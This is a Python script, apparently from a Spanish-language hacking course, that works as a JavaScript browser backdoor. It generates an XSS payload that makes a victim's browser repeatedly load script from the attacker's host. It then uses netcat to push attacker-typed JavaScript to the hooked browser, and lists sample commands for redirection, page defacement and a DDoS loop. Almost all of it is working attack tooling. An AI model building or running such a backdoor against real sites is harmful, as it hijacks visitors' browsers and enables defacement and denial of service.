#!/usr/bin/env python
import argparse
import socket
import os
import time
import sys
from subprocess import Popen,PIPE,STDOUT,call

def banner():
    print """
         
       _       ____             _       _                  
      | |     |  _ \           | |     | |                 
      | |___  | |_) | __ _  ___| | ____| | ___   ___  _ __ 
  _   | / __| |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 | |__| \__ \ | |_) | (_| | (__|   < (_| | (_) | (_) | |   
  \____/|___/ |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                           
    Developer :@svelizd
    Org: Backtrack Academy                                                       
    GitHub: https://github.com/SVelizDonoso
    """

def help():
    # Menu que se despliega solamente si al script se le pasan argumentos
	parser = argparse.ArgumentParser()
	parser.add_argument('-host', action='store', dest='lhost',help='IP del Servidor')
	parser.add_argument('-port', action='store', dest='lport',help='Puerto a la Escucha')
	parser.add_argument('--version', action='version', version='%(prog)s 1.0')
        return parser.parse_args()

def getIpServer():
    # Nos conectamos al DNS de google y nos retornara la Ip del Host
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	LHOST = s.getsockname()[0]
	s.close()
	return LHOST

def setServer():
	# verificamos configuraciones
        server = []
	results = help()
        if results.lhost == None:
		server.append(getIpServer())
	else:
		server.append(results.lhost)
	if results.lport == None:
		server.append("8083")
	else:
		server.append(results.lport)
	return server

def generatePayloadJS(host,port):
    # construimos el agente que se debe instalar por medio de un XSS refejado/almacenado o inyectado en una libreria js
	print 'Creando Payload para el cliente...'
	payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (host, port)
	return payload

def optionsbackdoor():
    # lista de comandos de ejemplo para ser ejecutados desde el servidor hacia el cliente
   options ="""
   Ejemplos de Payload:

   Mensaje:         alert('Hola Mundo!');
   Pregunta:        confirm("Te gustaria Aprender Haching?");
   Redireccion:     window.location = 'https://www.google.com';
   Nueva Ventana:   window.open('https://www.github.com'); 
   Defacement:      document.body.innerHTML = '<br><br><br><h1>Hackeado por @svelizd </h1>';
   Video:           document.body.innerHTML = '<iframe width="420" height="345" src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1"></iframe>';
   Imagen:          document.body.innerHTML = '<img src="https://pics.me.me/las-herramientas-de-hacking-y-pentestig-con-interfaz-grafica-24506564.png">';
   DDos             window.setInterval(function (){ $.getScript('http://sitio/'); $.getScript('http://sitio/'); },1000)
   Recargar         location.reload();

   """
   print options


def shell(port):
    # comando que lee y escribe en netcat por el puerto un especifico
    os.system('read c; echo "$c" | timeout 1 nc -lp '+port+' >/dev/null;')
    shell(port)

def status(port):
    # funcion que espera la conexion del cliente hasta que el cliente envie solicitud http
    proc=Popen('timeout 1 nc -lp '+port+'', shell=True, stdout=PIPE, )
    response = str(proc.communicate()[0])
    if 'Accept' in response:
        print (response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
        print ('\n La Victima se encuentra Online .\n\n' )
        print ' Ingrese alguna de las siguientes opciones para comenzar el ataque... '
        print optionsbackdoor()
        shell(port)
    else:
        time.sleep(2)
        status(port)

def main():
    # funcion que ejecuta todas las funciones
        help()
	banner()
	server = setServer()
	print generatePayloadJS(server[0],server[1])
	status(server[1])

if __name__ == "__main__":
    main()


